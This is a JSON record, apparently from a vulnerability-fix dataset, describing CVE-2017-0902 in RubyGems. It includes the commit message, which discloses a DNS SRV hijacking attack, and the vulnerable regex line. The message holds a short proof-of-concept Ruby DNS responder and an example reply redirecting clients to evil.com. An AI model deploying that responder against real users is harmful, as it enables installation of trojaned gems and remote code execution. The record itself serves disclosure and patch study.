{
    "cve_id": "CVE-2017-0902",
    "cve_description": "RubyGems version 2.6.12 and earlier is vulnerable to a DNS hijacking vulnerability that allows a MITM attacker to force the RubyGems client to download and install gems from a server that the attacker controls.",
    "cve_publish_date": "2017-08-31",
    "cwe_id": "CWE-346",
    "cwe_name": "Origin Validation Error",
    "cwe_description": "The product does not properly verify that the source of data or communication is valid.",
    "commit_message": "[RemoteFetcher] Avoid DNS Hijacking Vulnerability\n\nReported by @claudijd\n\n**Description:**\n\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is.  In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n\n    ~ $ dig srv _rubygems._tcp.rubygems.org +short\n    0 1 80 api.rubygems.org.\n\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain.  An example of\nsuch a scenario would look like so:\n\n    ~ $ dig _rubygems._tcp.rubygems.org SRV +short\n    0 0 53 evil.com/api.rubygems.com.\n\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios.  For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\n\nThis vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and\n[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).\n\n**Affected method in Gem::RemoteFetcher:**\n\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\n\n**PoC DNS SRV Responder:**\n\n    #!/usr/bin/env ruby\n    require 'rubydns'\n    require 'rubydns/system'\n    INTERFACES = [\n    \t[:udp, \"0.0.0.0\", 53],\n    \t[:tcp, \"0.0.0.0\", 53]\n    ]\n    Name = Resolv::DNS::Name\n    IN = Resolv::DNS::Resource::IN\n    RubyDNS::run_server(:listen => INTERFACES) do\n      match(//, IN::SRV) do |transaction|\n        transaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\n      end\n    end\n\n**Fix:**\n\nBy parsing the returned target as a URI and only matching against the\n`hostname`, we can ensure that only subdomains of the original host\nare redirected to. This way, adding URI-delimiting characters to the\n`target` cannot be used to front-pad the target, creating a\nfalse-positive match.",
    "type_of_change": "Modification",
    "filename_of_changes": "remote_fetcher.rb",
    "code_language": "Ruby",
    "number_of_lines_added_for_mitigation": "1",
    "number_of_lines_deleted_vulnerable_to_cve": "1",
    "vulnerable_lines": [
        "// Line_Reference 113:       if /\\.#{Regexp.quote(host)}\\z/ =~ target"
    ]
}
